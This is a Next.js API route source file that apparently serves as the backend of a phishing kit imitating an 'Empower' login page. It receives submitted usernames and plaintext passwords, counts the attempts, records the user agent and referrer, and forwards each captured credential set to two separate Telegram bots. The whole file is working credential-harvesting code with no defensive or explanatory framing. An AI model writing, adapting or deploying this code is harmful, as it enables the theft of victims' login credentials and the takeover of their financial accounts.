import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { username, password, attempt } = body

    const loginData = {
      username,
      password,
      timestamp: new Date().toISOString(),
      userAgent: request.headers.get("user-agent") || "Unknown",
      url: request.headers.get("referer") || "Unknown",
      attempt,
    }

    const message = `🔐Empower Login #${loginData.attempt}:\nUsername: ${loginData.username}\nPassword: ${loginData.password}\nTime: ${loginData.timestamp}\nURL: ${loginData.url}`

    // Send to first Telegram bot
    if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
      await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: process.env.TELEGRAM_CHAT_ID,
          text: message,
        }),
      })
    }

    // Send to second Telegram bot
    if (process.env.TELEGRAM_BOT_TOKEN2 && process.env.TELEGRAM_CHAT_ID2) {
      await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN2}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: process.env.TELEGRAM_CHAT_ID2,
          text: message,
        }),
      })
    }

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Failed to send to Telegram:", error)
    return NextResponse.json({ success: false, error: "Failed to send message" }, { status: 500 })
  }
}
